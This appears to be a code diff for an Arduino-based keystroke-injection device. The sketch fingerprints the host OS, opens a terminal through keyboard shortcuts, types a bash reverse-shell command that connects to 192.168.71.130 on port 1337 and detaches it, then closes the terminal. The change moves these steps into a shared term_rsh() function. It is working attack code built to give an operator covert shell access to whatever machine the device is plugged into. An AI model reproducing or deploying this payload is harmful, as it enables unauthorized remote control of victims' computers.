@@ -15,6 +15,7 @@ void setup() {
   delay(1000);
   FingerprintUSBHost.guessHostOS(os);
 
+  delay(1000);
   if (os == "MacOS") {
     mac();
   } else if (os == "Linux") {
@@ -25,7 +26,6 @@ void setup() {
 }
 
 void mac() {
-  delay(1000);
   // ⌘-Space
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press(' ');
@@ -33,17 +33,8 @@ void mac() {
   Keyboard.releaseAll();
   delay(100);
 
-  // Launch terminal
-  Keyboard.print("terminal");
-  delay(200);
-  Keyboard.write(KEY_RETURN);
-  delay(500);
-
-  // Create rsh
-  Keyboard.print("bash -i >& /dev/tcp/192.168.71.130/1337 0>&1 & disown");
-  delay(100);
-  Keyboard.write(KEY_RETURN);
-  delay(100);
+  // Launch terminal and create rsh
+  term_rsh();
 
   // Close terminal
   Keyboard.press(KEY_LEFT_GUI);
@@ -55,22 +46,12 @@ void mac() {
 }
 
 void linux() {
-  delay(1000);
   // Super
   Keyboard.write(KEY_LEFT_GUI);
   delay(100);
 
-  // Launch terminal
-  Keyboard.print("terminal");
-  delay(200);
-  Keyboard.write(KEY_RETURN);
-  delay(500);
-
-  // Create rsh
-  Keyboard.print("bash -i >& /dev/tcp/192.168.71.130/1337 0>&1 & disown");
-  delay(100);
-  Keyboard.write(KEY_RETURN);
-  delay(100);
+  // Launch terminal and create rsh
+  term_rsh();
 
   // Close terminal
   Keyboard.press(KEY_LEFT_ALT);
@@ -91,6 +72,20 @@ void windows() {
   Keyboard.press(KEY_DELETE);
   delay(100);
   Keyboard.releaseAll();
+  delay(100);
+}
+
+void term_rsh() {
+  // Launch terminal
+  Keyboard.print("terminal");
+  delay(200);
+  Keyboard.write(KEY_RETURN);
+  delay(500);
+
+  // Create rsh
+  Keyboard.print("bash -i >& /dev/tcp/192.168.71.130/1337 0>&1 & disown");
+  delay(100);
+  Keyboard.write(KEY_RETURN);
   delay(100);
 }
 
